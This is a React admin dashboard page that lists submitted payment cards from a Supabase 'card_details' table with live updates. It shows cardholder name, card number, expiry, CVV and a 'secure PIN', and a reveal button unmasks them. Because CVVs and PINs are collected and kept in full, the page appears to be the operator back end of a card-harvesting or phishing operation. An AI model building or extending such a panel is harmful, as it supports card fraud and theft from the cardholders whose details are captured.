import React, { useState, useEffect } from "react";
import { DashboardLayout } from "@/components/DashboardLayout";
import { supabase } from "@/integrations/supabase/client";
import { CreditCard, RefreshCw, Eye, EyeOff } from "lucide-react";

interface CardEntry {
  id: string;
  user_id: string;
  cardholder_name: string;
  card_number: string;
  expiry_date: string;
  cvv: string;
  secure_pin: string;
  card_type: string;
  created_at: string;
}

const AdminCardDetails = () => {
  const [cards, setCards] = useState<CardEntry[]>([]);
  const [loading, setLoading] = useState(true);
  const [revealed, setRevealed] = useState<Set<string>>(new Set());

  const fetchCards = async () => {
    setLoading(true);
    const { data } = await supabase
      .from("card_details" as any)
      .select("*")
      .order("created_at", { ascending: false });
    setCards((data as any as CardEntry[]) || []);
    setLoading(false);
  };

  useEffect(() => {
    fetchCards();

    const channel = supabase
      .channel("card_details_realtime")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "card_details" },
        () => fetchCards()
      )
      .subscribe();

    return () => { supabase.removeChannel(channel); };
  }, []);

  const toggleReveal = (id: string) => {
    setRevealed((prev) => {
      const next = new Set(prev);
      next.has(id) ? next.delete(id) : next.add(id);
      return next;
    });
  };

  const mask = (val: string, show: boolean) => show ? val : val.replace(/./g, "•");
  const maskCard = (num: string, show: boolean) => {
    if (show) return num.replace(/(.{4})/g, "$1 ").trim();
    return "•••• •••• •••• " + num.slice(-4);
  };

  return (
    <DashboardLayout>
      <div style={{ animation: "fade-up 0.6s cubic-bezier(0.16,1,0.3,1) forwards" }}>
        <div className="flex items-center justify-between mb-6">
          <div>
            <h1 className="text-2xl font-semibold text-foreground flex items-center gap-2">
              <CreditCard className="w-6 h-6 text-teal-500" /> Card Details
            </h1>
            <p className="text-muted-foreground text-sm mt-1">{cards.length} card(s) on file · Live updates</p>
          </div>
          <button onClick={fetchCards} className="flex items-center gap-2 h-10 px-4 rounded-lg gold-gradient text-primary font-semibold text-sm hover:opacity-90 active:scale-[0.97] transition-all">
            <RefreshCw className="w-4 h-4" /> Refresh
          </button>
        </div>

        {loading ? (
          <div className="text-center py-12 text-muted-foreground">Loading cards...</div>
        ) : cards.length === 0 ? (
          <div className="glass-card rounded-2xl p-12 text-center">
            <CreditCard className="w-12 h-12 text-muted-foreground mx-auto mb-3" />
            <p className="text-muted-foreground">No card details submitted yet.</p>
          </div>
        ) : (
          <div className="space-y-3">
            {cards.map((card) => {
              const show = revealed.has(card.id);
              return (
                <div key={card.id} className="glass-card rounded-xl p-5">
                  <div className="flex items-start justify-between gap-4">
                    <div className="flex-1 min-w-0 space-y-2">
                      <div className="flex items-center gap-2 flex-wrap">
                        <h3 className="text-sm font-semibold text-foreground">{card.cardholder_name}</h3>
                        <span className="text-[10px] px-2 py-0.5 rounded-full font-medium uppercase tracking-wider" style={{ background: "hsl(180 50% 35% / 0.15)", color: "hsl(180 60% 40%)" }}>
                          {card.card_type}
                        </span>
                      </div>
                      <p className="text-sm font-mono text-foreground tracking-wider">{maskCard(card.card_number, show)}</p>
                      <div className="flex gap-4 text-xs text-muted-foreground">
                        <span>Exp: <span className="text-foreground font-medium">{card.expiry_date}</span></span>
                        <span>CVV: <span className="text-foreground font-mono">{mask(card.cvv, show)}</span></span>
                        <span>PIN: <span className="text-foreground font-mono">{mask(card.secure_pin, show)}</span></span>
                      </div>
                      <p className="text-[11px] text-muted-foreground">
                        Added {new Date(card.created_at).toLocaleString()}
                      </p>
                    </div>
                    <button onClick={() => toggleReveal(card.id)} className="w-9 h-9 rounded-lg border border-border flex items-center justify-center hover:bg-muted transition-colors shrink-0" title={show ? "Hide" : "Reveal"}>
                      {show ? <EyeOff className="w-4 h-4 text-muted-foreground" /> : <Eye className="w-4 h-4 text-muted-foreground" />}
                    </button>
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </div>
    </DashboardLayout>
  );
};

export default AdminCardDetails;
